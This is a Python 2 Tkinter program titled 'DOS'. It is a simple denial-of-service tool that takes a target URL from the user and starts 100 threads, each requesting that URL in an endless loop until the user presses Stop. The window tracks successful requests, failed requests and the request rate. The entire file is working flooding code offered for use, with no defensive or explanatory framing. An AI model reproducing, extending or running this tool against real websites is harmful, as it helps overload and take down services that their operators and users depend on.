import urllib
import threading
import time
from Tkinter import *

adress = ''
las = list()
n = 0
e = 0
flag = bool()

root = Tk()
root.minsize(width = 300, height = 300)
root.maxsize(width = 300, height = 300)
root.title('DOS')
base = Frame(root, width = 300, height = 300, bg = 'black',bd = 5)

class Widgets():
	
	def __init__(self):
		self.ent1 = Entry(base, width = 29, bd = 3)	 #URL-input field
		self.ent1.place(x = 9, y = 10)
		self.lab1 = Label(base, bg = 'grey', font = ('Arial', 15))	#Number field
		self.lab1.place(x = 95, y = 90, width = 70, height = 25)
		self.lab2 = Label(base, bg = 'black', fg = 'white', text = 'Transmitted', font = ('Arial', 15))	#First title
		self.lab2.place(x = 10, y = 90, width = 90, height = 25)
		self.lab3 = Label(base, bg = 'grey', fg = 'red', font = ('Arial', 15))	#Cancelled number field
		self.lab3.place(x = 95, y = 130, width = 70, height = 25)
		self.lab4 = Label(base, bg = 'black', fg = 'white', text = 'Crashed', font = ('Arial', 15))	#Second title
		self.lab4.place(x = 30, y = 130, width = 70, height = 25)
		self.lab5 = Label(base, bg = 'grey', fg = 'black', font = ('Arial', 15))	#Speed value field
		self.lab5.place(x = 95, y = 170, width = 70, height = 25)
		self.lab6 = Label(base, bg = 'black', fg = 'white', text = 'Velocity', font = ('Arial', 15))	#Third title
		self.lab6.place(x = 30, y = 170, width = 70, height = 25)
		self.lab7 = Label(base, bg = 'black', fg = 'grey', text = 'Waiting', font = ('Arial', 15))	#Fourth title
		self.lab7.place(x = 180, y = 250, width = 70, height = 25)
		
	def Button1(self):
		but1 = Button(base, text = 'Start', bg = 'black', fg = 'white')
		but1.place(x = 20, y = 250, width = 80, height = 25)
		but1.bind('<Button-1>', self.Atack)
		
	def Button2(self):
		but2 = Button(base, text = 'Stop', bg = 'black', fg = 'white')
		but2.place(x = 100, y = 250, width = 80, height = 25)
		but2.bind('<Button-1>', self.Stop)
		
	def Stop(self, event):
		self.lab7.configure(fg = 'red', text = 'Stopped')
		global flag
		flag = False
	
	def Counter(self):
		while flag == True:
			time.sleep(1)
			number1 = self.lab1.cget('text')
			time.sleep(1)
			number2 = self.lab1.cget('text')
			try:
				self.lab5.configure(text = '{} p/sec'.format(str(int(number2)-int(number1))))
			except:
				self.lab5.configure(text = '{} p/sec'.format('0'))
		
	def Atack(self, event):
		global flag
		global adress
		flag = True
		self.lab7.configure(fg = 'green', text = 'Retrieving')
		threading.Thread(target = self.Counter).start()
		adress = self.ent1.get()
		for i in range(100):
			las.append(threading.Thread(target=self.Request))
			las[i].start()

	def Request(self):
		while flag == True:
			try:
				req = urllib.urlopen(adress)
				global n
				n+=1
				self.lab1.configure(text = str(n))
			except:
				global e
				e+=1
				self.lab3.configure(text = str(e))
		
			

widgets = Widgets()
widgets.Button1()
widgets.Button2()

base.pack()
root.mainloop()